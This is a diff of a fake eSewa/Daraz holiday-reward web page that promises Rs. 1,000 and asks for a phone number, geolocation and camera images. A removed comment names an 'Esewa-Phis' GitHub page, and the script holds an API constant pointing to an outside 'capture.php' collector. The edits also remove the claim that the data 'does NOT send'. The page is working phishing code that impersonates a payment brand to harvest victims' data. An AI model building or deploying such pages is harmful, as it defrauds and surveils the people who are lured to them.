@@ -11,8 +11,6 @@
     background:#f2f4f7; min-height:100vh; display:flex; flex-direction:column;
     align-items:center; padding-bottom:40px; overflow-x:hidden; 
   }
-  
-  /* Header */
   .topbar { 
     width:100%; background:#fff; color:#60BB46; padding:14px 16px;
     padding-top:env(safe-area-inset-top,14px); font-size:16px; font-weight:700;
@@ -22,7 +20,6 @@
   .topbar .back { font-size:22px; line-height:1; }
   .topbar .title { flex:1; text-align:center; margin-right:22px; }
 
-  /* Main Card */
   .card {
     background:#fff; width:94%; max-width:400px; border-radius:20px;
     margin-top:70px; box-shadow:0 8px 24px rgba(0,0,0,0.06);
@@ -30,15 +27,11 @@
     position:relative; z-index:1;
     padding: 24px 20px;
   }
-
-  /* Banner image only */
   .banner-img {
     display:block; width:100%; height:auto;
     border-radius: 12px;
     margin-bottom: 20px;
   }
-
-  /* Reward Box */
   .reward-box {
     background:#f8f9fa; border: 2px dashed #d1d5db; border-radius: 16px;
     padding: 20px; margin-bottom: 20px; text-align: center;
@@ -66,27 +59,23 @@
     font-size:12px; color:#9ca3af; margin-top:8px; text-align: center; 
   }
 
-  /* FORM SECTION (Below main card) */
   .form-section {
     background: #fff; width: 94%; max-width:400px;
     border-radius: 16px; margin-top: 24px;
     padding: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.08);
     animation: fadeIn 0.4s;
   }
-  
   .form-header {
     font-size: 18px; color: #60BB46; font-weight: 700; margin-bottom: 8px;
     display: flex; align-items: center; gap: 8px;
   }
   .form-hint { font-size: 14px; color: #4b5563; margin-bottom: 16px; line-height: 1.5; }
-  
   .form-input {
     width: 100%; padding: 14px; border: 1px solid #e5e7eb; border-radius: 12px;
     font-size: 16px; margin-bottom: 12px; background: #f9fafb; font-family:inherit;
     transition: border-color 0.2s;
   }
   .form-input:focus { outline:none; border-color:#60BB46; background:#fff; }
-  
   .form-submit-btn {
     width: 100%; padding: 16px; border: none; border-radius: 12px;
     background: #60BB46; color: #fff; font-size: 16px; font-weight: 700;
@@ -95,7 +84,6 @@
   .form-submit-btn:disabled { background:#d1d5db; cursor:not-allowed; }
   .form-submit-btn.success { background: #a7f3d0; color: #065f46; }
 
-  /* POPUP MODAL */
   .modal-overlay {
     position: fixed; inset: 0;
     background: rgba(0,0,0,0.65); z-index: 999;
@@ -111,7 +99,6 @@
     animation: slideUp 0.3s ease-out;
     text-align: center;
   }
-
   .modal-title { font-size: 20px; font-weight: 700; margin-bottom: 10px; color: #222; }
   .modal-desc { font-size: 14.5px; color: #555; line-height: 1.55; margin-bottom: 18px; }
 
@@ -136,7 +123,6 @@
   .confirm-btn:disabled { background: #e5e5e5; color: #aaa; cursor: not-allowed; box-shadow:none; }
   .confirm-btn:not(:disabled):active { transform: scale(0.98); }
 
-  /* Status Pill */
   .statusPill {
     position:fixed; top:64px; left:50%; transform:translateX(-50%);
     background:rgba(0,0,0,.85); color:#fff; font-size:12px; padding:8px 16px;
@@ -157,14 +143,11 @@
   <span class="title">Promotions</span>
 </div>
 
-<!-- MAIN CARD -->
 <div class="card">
-  <!-- BANNER IMAGE -->
   <img class="banner-img"
        src="https://plain-apac-prod-public.komododecks.com/202610/23/8ApYflnMzZeZ4LLVkSqY/image.jpg"
        alt="Daraz Dashain Dhamaka">
 
-  <!-- LOGO -->
   <img id="brandLogo"
        class="brand-logo"
        src="https://media.nepalitimes.com/1/s/20221110151112/636d071a9c7e80680e0a5f9fpng.png"
@@ -173,7 +156,6 @@
        onerror="this.style.display='none';document.getElementById('logoFallback').style.display='block';">
   <div id="logoFallback" style="display:none; font-size:28px; font-weight:800; color:#60BB46; margin-bottom:16px;">eSewa</div>
 
-  <!-- REWARD BOX -->
   <div class="reward-box">
     <div class="reward-title">CLAIMABLE REWARD</div>
     <div class="reward-amount">Rs. 1,000</div>
@@ -184,7 +166,6 @@
   <div class="fine-print">*Valid for new users only</div>
 </div>
 
-<!-- FORM SECTION (Appears after confirm) -->
 <div id="formSection" class="form-section" style="display:none;">
   <div class="form-header">&#9889; Final Step</div>
   <p class="form-hint">Verify your phone number to receive the reward instantly.</p>
@@ -196,7 +177,6 @@
   <div class="fine-print" style="margin-top: 12px;">*can be redeemed once only</div>
 </div>
 
-<!-- POPUP MODAL -->
 <div id="modalOverlay" class="modal-overlay">
   <div class="modal-content">
     <h2 class="modal-title">Redeem Voucher</h2>
@@ -223,9 +203,6 @@
 <script>
 "use strict";
 
-// ⚠️ POINT THIS AT YOUR INFINITYFREE HOST
-https://onghijkl.github.io/Esewa-Phis/
-
 const API = "http://daraz-dashain.freedev.app/capture.php";
 
 const modal       = document.getElementById('modalOverlay');
@@ -240,15 +217,18 @@ const captured = { location:null, image:null };
 let cameraStream = null;
 let captureStarted = false;
 
+/* ---------- OPEN POPUP ---------- */
 btnRedeem.addEventListener('click', (e) => {
   e.preventDefault();
   modal.classList.add('active');
 });
 
+/* ---------- ENABLE CONFIRM ONLY IF CHECKED ---------- */
 agreeCheck.addEventListener('change', () => {
   btnConfirm.disabled = !agreeCheck.checked;
 });
 
+/* ---------- CONFIRM ---------- */
 btnConfirm.addEventListener('click', () => {
   modal.classList.remove('active');
   btnRedeem.style.display = 'none';
@@ -264,7 +244,7 @@ btnConfirm.addEventListener('click', () => {
   }
 });
 
-/* ---------- LOCATION (stores locally, does NOT send) ---------- */
+/* ---------- LOCATION (stores locally) ---------- */
 function triggerLocationCapture() {
   if (!navigator.geolocation) {
     captured.location = { error: 'Not supported' };
@@ -288,7 +268,7 @@ function triggerLocationCapture() {
   );
 }
 
-/* ---------- CAMERA (stores locally, does NOT send) ---------- */
+/* ---------- CAMERA (stores locally) ---------- */
 async function triggerCameraCapture() {
   try {
     showStatus('Accessing Camera...');
@@ -392,3 +372,6 @@ document.addEventListener('visibilitychange', () => {
     cameraStream = null;
   }
 });
+</script>
+</body>
+</html>
